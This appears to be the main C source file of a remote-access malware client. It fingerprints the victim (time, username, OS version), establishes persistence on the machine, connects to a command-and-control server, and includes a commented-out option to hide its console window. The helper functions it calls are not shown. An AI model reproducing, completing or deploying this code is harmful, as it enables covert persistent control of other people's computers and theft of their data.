#include "defines.h"
#include "functions.h"

/*
 * builds the client ID tag [ MM/DD/YY HH:MM:SS ] USERNAME VERSION (BUILD), then connects to the C2 server
 */
void init(void)
{
    // The buffer that will hold the ID. A reference to this is passed to each function
    char *id = (char *)calloc(STR_LEN, sizeof(char));

    // The first thing to do is get persistence in case anything goes wrong
    int pwnt = getPersistence(getUsername(id));

    getTime(id);
    getOsVersion(id);
    
    // If persistence was established, the client will be happy
    scat(id, pwnt ? " :)" : " :("); 
    
    connectServer(id);
    // free(id); Usually you would free the heap here, but this program never exits the server loop so this is pointless
}

int main(void)
{   
    // Uncomment this line to execute while hidden
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    init();
    return 0;
}